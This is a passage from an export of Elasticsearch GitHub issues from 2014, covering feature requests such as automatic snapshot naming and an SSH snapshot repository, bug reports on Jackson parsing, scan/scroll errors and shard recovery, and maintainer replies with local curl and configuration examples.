</description><key id="44497774">7940</key><summary>[TEST] Make mlt rest tests pass on a single node cluster</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">HonzaKral</reporter><labels /><created>2014-09-30T20:46:00Z</created><updated>2014-09-30T21:29:06Z</updated><resolved>2014-09-30T21:29:05Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Automatic snapshot naming</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7939</link><project id="" key="" /><description>It would be useful if Elasticsearch could generate automatic snapshot names. This would be a POST to the repository instead of a PUT to a snapshot name.

```
curl -XPOST localhost:9200/_snapshot/my-repository
```

The name could be generated by incrementing a number (`1`, `2`, `3`, etc), getting the current timestamp, or generating a flake id.

To organize snapshots in a repository, the POST action could accept a prefix parameter.

```
curl -XPOST localhost:9200/_snapshot/my-repository?prefix=my-index -d '{"indices":"my-index"}'
```
</description><key id="44492862">7939</key><summary>Automatic snapshot naming</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">open</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">grantr</reporter><labels><label>:Snapshot/Restore</label><label>adoptme</label><label>enhancement</label></labels><created>2014-09-30T19:58:02Z</created><updated>2016-11-06T07:41:48Z</updated><resolved /><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2015-02-20T11:13:53Z" id="75222713">I would be wary of just having an incrementing number as it doesn't containing any information about the point in time the snapshot relates to, but maybe we could use something like the combination of timestamp and flake ID so that the timestamp indicates the point in time the snapshot was created and the flake ID makes the name unique?
</comment><comment author="grantr" created="2015-02-21T20:58:13Z" id="75392568">@colings86 the snapshot metadata already includes the timestamp, so it's not necessary for preserving snapshot creation time. Still, I support using the timestamp as id because timestamps are useful when looking at a list of snapshot names. Most of our snapshots are named with the pattern `prefix-2015-02-21_12-57-41` for natural ordering and so that it's easy to see when snapshots occurred.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>SSH-based snapshot repository type</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7938</link><project id="" key="" /><description>Sometimes a shared filesystem is too much work to set up. The most convenient way to transfer files securely between remote nodes is usually SCP.

A snapshot repository type that used SSH to transfer files to a remote host would be a great addition to Elasticsearch, and would make snapshots more useful out of the box.

Configuration could be something like this:

```
{
    "type": "ssh",
    "settings": {
        "location": "elasticsearch@remote.example.com:/backups/elasticsearch",
        "ssh_key": "/home/elasticsearch/.ssh/id_rsa"
    }
}
```

What do you think @imotov?
</description><key id="44492245">7938</key><summary>SSH-based snapshot repository type</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">grantr</reporter><labels><label>:Snapshot/Restore</label><label>adoptme</label><label>discuss</label></labels><created>2014-09-30T19:51:34Z</created><updated>2014-12-05T08:23:32Z</updated><resolved>2014-12-05T08:23:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nirmalc" created="2014-10-24T17:23:00Z" id="60420410">I'm glad someone else needs this feature as well !  :+1: 
</comment><comment author="marevol" created="2014-12-04T10:11:23Z" id="65607487">I created SSH repository for elasticsearch 1.4:
https://github.com/marevol/elasticsearch/commit/bf0348c732d3d35e2634c8db3f42c2112d76e4da
If we have a chance to merge it, I'll send PR.
The configuration to create ssh repository is below.

```
curl -XPUT 'http://localhost:9200/_snapshot/backup_ssh' -d '{
    "type": "ssh",
    "settings": {
        "location": "/somewhere/snapshot_dir",
        "host": "123.123.123.123",
        "port": 22,
        "username": "taro",
        "password": "xxxxxxxx",
        "compress": true
    }
}'
```
</comment><comment author="dadoonet" created="2014-12-04T10:53:30Z" id="65615264">I like the idea. Just wondering if this should come as a built-in feature or as a plugin.
@imotov WDYT?
</comment><comment author="jpountz" created="2014-12-04T11:07:06Z" id="65616790">Isn't it easy enough to mount a remote filesystem using [sshfs](http://fuse.sourceforge.net/sshfs.html)?
</comment><comment author="dadoonet" created="2014-12-04T11:11:54Z" id="65617289">@jpountz It could be enough. But I think it requires more work (administrative task) as you need to mount this on every single node. With SSH, you just have to use it! :)
</comment><comment author="rmuir" created="2014-12-04T11:39:57Z" id="65620101">But then that work is done in the right place, by the user. 

Otherwise, elasticsearch has to interact with ssh directly like here:
- i dont like private keys read in as string
- what if i want ssh-agent support?
- what if my private key requires a pass phrase?
- why are options like StrictHostKeyChecking automatically turned off?!
- what about security vulnerabilities or problems in this 'jsch' ssh implementation, now or in the future?

This is too scary IMO. 
</comment><comment author="s1monw" created="2014-12-04T12:47:28Z" id="65626902">I agree we should not deal with credentials here. I think we should rather make it super simple to configure this and / or make it simpler to build your own plugin if you really wanna do that as a build in option. 
</comment><comment author="grantr" created="2014-12-04T18:15:50Z" id="65676552">@jpountz sshfs requires fuse support and is unreliable.

A more general solution is a command executor that spawns one or more processes with arguments similar to scp. The command returns success if the files are successfully handled.

```
{
    "type": "process",
    "settings": {
        "command": "/usr/local/bin/scp_to_remote"
    }
}
```

There are a lot of details to work out (safely spawning processes, timeouts, retries, argument formatting) but if it worked it could be useful for integrating with existing backup solutions.
</comment><comment author="s1monw" created="2014-12-04T19:47:38Z" id="65691199">&gt; There are a lot of details to work out (safely spawning processes, timeouts, retries, argument formatting) but if it worked it could be useful for integrating with existing backup solutions.

I am not a huge fan of external proceses. This is so painful in java I don't think this will be an option here to be honest.
</comment><comment author="marevol" created="2014-12-05T08:10:23Z" id="65758897">Thank you for your comment/feedback.
I think that it's better to avoid any security concerns in elasticsearch.
I'll modify/provide it as one of plugins in https://github.com/codelibs
</comment><comment author="dadoonet" created="2014-12-05T08:23:32Z" id="65759910">Ok. So we can close this thread. When you're done, feel free to update the plugins page. Thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Adding community-contributed Scout plugins</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7937</link><project id="" key="" /><description>Scout plugins for reporting key node, cluster, and index health metrics.
</description><key id="44479736">7937</key><summary>Adding community-contributed Scout plugins</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">itsderek23</reporter><labels><label>docs</label></labels><created>2014-09-30T18:06:06Z</created><updated>2014-10-16T15:39:48Z</updated><resolved>2014-10-16T14:47:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-14T13:28:37Z" id="59042702">Hi @itsderek23 

Thanks for the PR.  Please could I ask you to sign the CLA so that I can merge this in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="itsderek23" created="2014-10-14T16:03:11Z" id="59070401">Done! Let me know if you need any verification from my end (I provided by github user name, @itsderek23).
</comment><comment author="clintongormley" created="2014-10-16T14:47:41Z" id="59372878">thanks @itsderek23 - merged
</comment><comment author="itsderek23" created="2014-10-16T15:39:48Z" id="59382071">Thanks @clintongormley!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Show open and closed indices in _cat/indices</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7936</link><project id="" key="" /><description>When asking for `GET /_cat/indices?v`, you can now retrieve closed indices in addition to opened ones.

```
health status index              pri rep docs.count docs.deleted store.size pri.store.size
yellow open   .marvel-2014.05.21   1   1       8792            0     21.7mb         21.7mb
       close  test
yellow open   .marvel-2014.05.22   1   1       3871            0     10.7mb         10.7mb
red    open   .marvel-2014.05.27   1   1
```

Closes #7907.
</description><key id="44465654">7936</key><summary>Show open and closed indices in _cat/indices</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>:CAT API</label><label>feature</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T16:07:34Z</created><updated>2015-06-06T17:59:12Z</updated><resolved>2014-10-03T12:14:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-10-01T15:01:47Z" id="57477747">@s1monw PR updated.
</comment><comment author="s1monw" created="2014-10-02T20:18:26Z" id="57698473"> I think this LGTM - any change we can get a rest test for this?
</comment><comment author="michaelsalmon" created="2015-03-04T15:00:41Z" id="77172706">This doesn't seem to have made it into the guide yet.
</comment><comment author="clintongormley" created="2015-03-09T00:25:34Z" id="77784419">@dadoonet please could you document this change?
</comment><comment author="dadoonet" created="2015-03-09T22:47:47Z" id="77961204">@michaelsalmon thanks for raising it. I totally missed that.
@clintongormley done in master, 1.x and 1.4 branches.
</comment><comment author="michaelsalmon" created="2015-03-11T10:51:43Z" id="78241680">It looks good but I'm pretty sure that line 44 should end -rnk8 now.
</comment><comment author="dadoonet" created="2015-03-11T12:25:37Z" id="78253178">So true! Will fix. Thanks.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix config path extraction from plugin handle</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7935</link><project id="" key="" /><description>The PluginManager had a subtle bug in case the config directory was not in the
es home directory - which is always true in case of packaging.

This fixes the plugin manager, so that when specifying a path.home and a
path.conf variable on the commandline, the plugin manager acts
appropriately.
</description><key id="44464290">7935</key><summary>Fix config path extraction from plugin handle</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Plugins</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T15:56:54Z</created><updated>2015-06-08T00:16:56Z</updated><resolved>2014-09-30T17:52:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-30T15:59:39Z" id="57337006">LGTM
</comment><comment author="dadoonet" created="2014-11-01T07:18:09Z" id="61360431">@spinscale I think we should try to fix this in 1.3 as well. WDYT?
</comment><comment author="spinscale" created="2014-11-01T07:34:52Z" id="61360729">@dadoonet valid point, I agree
@clintongormley objections?
</comment><comment author="clintongormley" created="2014-11-01T14:54:29Z" id="61370612">@spinscale none - add to 1.3.5 as well
</comment><comment author="spinscale" created="2014-11-02T07:19:46Z" id="61396855">done
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade to Jackson 2.4.2</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7934</link><project id="" key="" /><description>relates to #7932
</description><key id="44458925">7934</key><summary>Upgrade to Jackson 2.4.2</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Core</label><label>upgrade</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T15:15:40Z</created><updated>2015-08-25T13:25:44Z</updated><resolved>2014-10-02T19:33:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-10-02T19:12:23Z" id="57689807">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Changed the root rest endpoint ('/') to use cluster service</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7933</link><project id="" key="" /><description>Instead of issuing a redundant cluster state request.

Closes #7899
</description><key id="44455442">7933</key><summary>Changed the root rest endpoint ('/') to use cluster service</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:REST</label><label>blocker</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T14:50:10Z</created><updated>2015-06-07T11:59:35Z</updated><resolved>2014-09-30T14:58:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-30T14:51:28Z" id="57325843">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Jackson #146 affects ES bulk API: parse error on large document containing negative floats.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7932</link><project id="" key="" /><description>When bulk-uploading large docs containing negative floats, Jackson sometimes triggers a parse error. It happens when the negative float is located on the boundaries of Jackson's inner buffer (4096 bytes chunk I think?).
See: https://github.com/FasterXML/jackson-core/issues/146
The issue has been corrected in Jackson 2.4.2.
</description><key id="44453209">7932</key><summary>Jackson #146 affects ES bulk API: parse error on large document containing negative floats.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Bvggy</reporter><labels><label>enhancement</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-30T14:34:06Z</created><updated>2014-10-02T19:40:34Z</updated><resolved>2014-10-02T19:33:06Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-30T14:45:04Z" id="57324806">will upgrade existing branches of ES to it soonish
</comment><comment author="s1monw" created="2014-09-30T14:45:35Z" id="57324897">++
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Recovering of shard which size more then hdd size</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7931</link><project id="" key="" /><description>Now we use 3 ssd by 300GB. They contain two shards of 350GB. And if one shard was corrupted, recovery flow try to recover it on single hdd (w/o using other ones), and does not distribute files over all hdds (as expected).

ES version: 1.3.1
</description><key id="44450664">7931</key><summary>Recovering of shard which size more then hdd size</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">olehrgf</reporter><labels><label>feedback_needed</label></labels><created>2014-09-30T14:15:34Z</created><updated>2014-12-30T20:28:58Z</updated><resolved>2014-12-30T20:28:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-14T13:18:10Z" id="59041093">Thanks for raising this.  We'll take a look at what we can do here.
</comment><comment author="clintongormley" created="2014-10-17T13:59:30Z" id="59516533">Hi @olehrgf 

Was the ssd that it chose to recover the shard onto emptier than the other two?  There are two "distributors" which decide which data path to use next: `least_used` (the default) and `random`.

Could you possibly try setting `index.store.distributor` to `random` and see if the behaviour changes?  Or leave it as `least_used` but then make sure that all 3 disks have similar amounts of free space?

thanks
</comment><comment author="olehrgf" created="2014-10-17T14:49:27Z" id="59523869">Sorry, but I cannot check changes with this setting (index.store.distributor=random). 
As to free space... When I had this issue all 3 ssds had similar free disk space.

There is also a minor clarification to my question ... From sources I see that Distributor chooses only one directory for recovering. My question is what will it do if chosen directory doesn't have free disk space enough for recovering?
</comment><comment author="clintongormley" created="2014-10-17T15:30:13Z" id="59530218">@olehrgf where do you see that?
</comment><comment author="clintongormley" created="2014-12-30T20:28:58Z" id="68394746">No further info provided. Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Will version 1.3.3 work with client 1.3.1?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7930</link><project id="" key="" /><description>We want to upgrade our elasticsearch cluster, which currently runs version 1.3.1.
But, we have both a test &amp; production environment so we would prefer to only upgrade the cluster itself without upgrading the client (so that we can safely deploy versions to production during our testing).

So, is it possible to run client 1.3.1 with elasticsearch cluster running 1.3.3?
If not, what alternatives can I have?
</description><key id="44448425">7930</key><summary>Will version 1.3.3 work with client 1.3.1?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ronsher</reporter><labels /><created>2014-09-30T13:57:44Z</created><updated>2014-09-30T14:02:08Z</updated><resolved>2014-09-30T14:02:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-30T14:02:08Z" id="57317926">please use the mailiing list for questions like this. but the answer is yes the client will work.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Indexed script fixes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7929</link><project id="" key="" /><description> On Disk Scripts : Make on disk scripts re-load timing dynamically configurable.
This change adds a new resource watcher level of CUSTOM and allows the addition of custom levels of timing.
This is used by the ScriptService to register the FileWatcher.

Search Templates: Add render endpoint for rendering templates
This commit adds a render endpoint to allow rendering of templates.

```
POST /_render/template
'{
  "template":
  {
    "query":
      {
        "{{foo}}": {}
      },
    "size": "{{my_{{}}size}}"
   },
   "params": { "foo": "match_all", "my_size": 10}
}'
```

Will render

```
{
  "template" :
  {
    "query" : {
      "match_all" : {}
    },
    "size" : 10
  }
}
```

Closes #6821
</description><key id="44447404">7929</key><summary>Indexed script fixes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>enhancement</label></labels><created>2014-09-30T13:49:52Z</created><updated>2015-07-03T10:06:47Z</updated><resolved>2015-07-03T10:06:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="GaelTadh" created="2014-09-30T14:27:02Z" id="57321793">I'm updating the docs for the new timing parameter right now.
</comment><comment author="s1monw" created="2014-10-06T14:23:36Z" id="58023894">I left some comments, yet I think the rendering functionality is awesome but the custom reload interval I am not sure about. What is the usecase and / or where is `LOW` not `LOW` enough?
</comment><comment author="s1monw" created="2015-03-02T10:25:37Z" id="76688441">@GaelTadh this has been stalled since 5 month, what's the status?
</comment><comment author="javanna" created="2015-07-03T10:06:40Z" id="118304644">This PR is very old, most of it got merged with #11570 anyway. Closing.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>upsert with script and retry_on_conflict don't work as documentation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7928</link><project id="" key="" /><description>I need to use script with upsert and that if the new document are created, the script will be played.

As the documentation said, we can use retry_on_conflict
http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/partial-updates.html

POST /website/pageviews/1/_update?retry_on_conflict=5 
{
   "script" : "ctx._source.views+=1",
   "upsert": {
       "views": 0
   }
}

when i test that on ES 1.3.2,  i get 
{
   "_index": "website",
   "_type": "pageviews",
   "_id": "1",
   "_version": 1,
   "found": true,
   "_source": {
      "views": 0
   }
}

I will need : "views": 1
</description><key id="44439939">7928</key><summary>upsert with script and retry_on_conflict don't work as documentation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ademar59</reporter><labels /><created>2014-09-30T12:59:51Z</created><updated>2015-10-16T08:26:28Z</updated><resolved>2014-10-14T12:34:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-14T12:34:26Z" id="59035304">@ademar59 it is working as described.  if the document doesn't yet exist, then the `upsert` document is inserted, OTHERWISE the script is run.
</comment><comment author="woodydrn" created="2015-10-16T08:26:28Z" id="148650997">You can use scripted_upsert to run the script even if the document doesn't exists
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>log4j rollingPolicy support</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7927</link><project id="" key="" /><description>I've been trying to get elasticsearch to compress log files with gzip. This requires a rollingFileAppender using a TimeBasedRollingPolicy (http://stackoverflow.com/questions/3329385/compress-log4j-files). I've tried to do this using the configuration below but without success, I think because log4j extras isn't included in elasticsearch (https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/common/logging/log4j/LogConfigurator.java) .

Could support for this be added at some point?

```
appender:
  file:
    type: rollingFile
    file: ${path.logs}/elasticsearch.log.gz
    rollingPolicy: TimeBasedRollingPolicy
    rollingPolicy.FileNamePattern: ${path.logs}/elasticsearch%d{yyyy-MM-dd}.log.gz
    layout:
      type: pattern
      conversionPattern: "%d{ISO8601}"
```

Thanks
</description><key id="44423025">7927</key><summary>log4j rollingPolicy support</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">philmcmahon</reporter><labels /><created>2014-09-30T10:37:25Z</created><updated>2014-11-13T12:45:29Z</updated><resolved>2014-11-13T12:45:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="schmorgs" created="2014-10-01T07:57:47Z" id="57430769">Seconded.  This would make make life easier than writing our own housekeeping outside of ES.
Additionally, adding deletion of archived logs after a given period to complete this item.

e.g. maxBackupIndex: 14
</comment><comment author="colings86" created="2014-11-05T12:08:10Z" id="61797928">@philmcmahon I have just tried this and I think you might just a few errors in your configuration. If you download the log4j-extras jar and put it in the lib directory of your elasticsearch nodes, you can get the TimeBasedRollingPolicy working using the following snippet in your `logging.yml` file:

``` yaml
file:
    type: org.apache.log4j.rolling.RollingFileAppender
    file: ${path.logs}/elasticsearch-timebased.log.gz
    rollingPolicy: org.apache.log4j.rolling.TimeBasedRollingPolicy
    rollingPolicy.FileNamePattern: ${path.logs}/elasticsearch%d{yyyy-MM-dd}.log.gz
    layout:
      type: pattern
      conversionPattern: "%d{ISO8601}"
```

Any custom policies or appenders need to be specified with their fully qualified class name to be found correctly by the loggers.

Let me know if this helps.
</comment><comment author="philmcmahon" created="2014-11-05T18:11:14Z" id="61854028">Thanks for the response. The above configuration works if I download the log4j-extras jar myself, but it would be better if it were added as a dependency to elasticsearch: https://github.com/elasticsearch/elasticsearch/pull/7947/files
</comment><comment author="colings86" created="2014-11-07T10:44:43Z" id="62126130">@philmcmahon We discussed this and agree that log4j-extras is a common enough use-case that is make sense to include it in the dependencies. We would also like to add some documentation around this and update the LogConfigurator replacements to allow the short form of the RollingFileAppender and TimeBasedRollingPolicy class names. I can look at this soon unless you would like to have a go at updating your PR with these changes?
</comment><comment author="philmcmahon" created="2014-11-07T11:48:32Z" id="62132188">I've updated the PR, I wasn't sure what to call the log4j-extras RollingFileAppender as we already have the log4j RollingFileAppender (maybe we don't need this anymore?) - currently it's 'extrasRollingFile'.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ArrayIndexOutOfBoundsException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7926</link><project id="" key="" /><description>I am using the latest version of elasticsearch and I got this error when I use scroll with large number size and scan as a search type

{"error":"ArrayIndexOutOfBoundsException[-131072]","status":500}

thous it perfectly works woth small sizes

ex. 

``` bash
[01:21:39] lnxg33k@ruined-sec &#10140; ~: curl -XGET "http://localhost:9200/dns_logs/pico/_search?search_type=scan&amp;scroll=1m" -d "{
                                   "query": { "match_all": {}},
                                   "size":  100000
                                   }"
{"_scroll_id":"c2Nhbjs1OzUxOjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NTM6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzs1Mjo4Zko2ODZBVVRueVpsbE90WXF4MmpnOzU0OjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NTU6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzsxO3RvdGFsX2hpdHM6NTIwNzY2ODg7","took":132,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":52076688,"max_score":0.0,"hits":[]}}&#9166;                                                                                                                     [01:21:50] lnxg33k@ruined-sec &#10140; ~: curl -XGET "http://localhost:9200/_search/scroll?scroll=1m&amp;scroll_id=c2Nhbjs1OzUxOjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NTM6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzs1Mjo4Zko2ODZBVVRueVpsbE90WXF4MmpnOzU0OjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NTU6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzsxO3RvdGFsX2hpdHM6NTIwNzY2ODg7" &gt; xxx.json
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  262M  100  262M    0     0   129M      0  0:00:02  0:00:02 --:--:--  129M
[01:22:03] lnxg33k@ruined-sec &#10140; ~: du -sh xxx.json 
263M    xxx.json
```

``` bash
[01:22:07] lnxg33k@ruined-sec &#10140; ~: curl -XGET "http://localhost:9200/dns_logs/pico/_search?search_type=scan&amp;scroll=1m" -d "{
                                   "query": { "match_all": {}},
                                   "size":  1000000
                                   }"
{"_scroll_id":"c2Nhbjs1OzU2OjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NTc6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzs1ODo4Zko2ODZBVVRueVpsbE90WXF4MmpnOzU5OjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NjA6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzsxO3RvdGFsX2hpdHM6NTIwNzY2ODg7","took":128,"timed_out":false,"_shards":{"total":5,"successful":5,"failed":0},"hits":{"total":52076688,"max_score":0.0,"hits":[]}}&#9166;                                                                                                                     [01:22:38] lnxg33k@ruined-sec &#10140; ~: curl -XGET "http://localhost:9200/_search/scroll?scroll=1m&amp;scroll_id=c2Nhbjs1OzU2OjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NTc6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzs1ODo4Zko2ODZBVVRueVpsbE90WXF4MmpnOzU5OjhmSjY4NkFVVG55WmxsT3RZcXgyamc7NjA6OGZKNjg2QVVUbnlabGxPdFlxeDJqZzsxO3RvdGFsX2hpdHM6NTIwNzY2ODg7"
{"error":"ArrayIndexOutOfBoundsException[null]","status":500}&#9166;                                                           
```
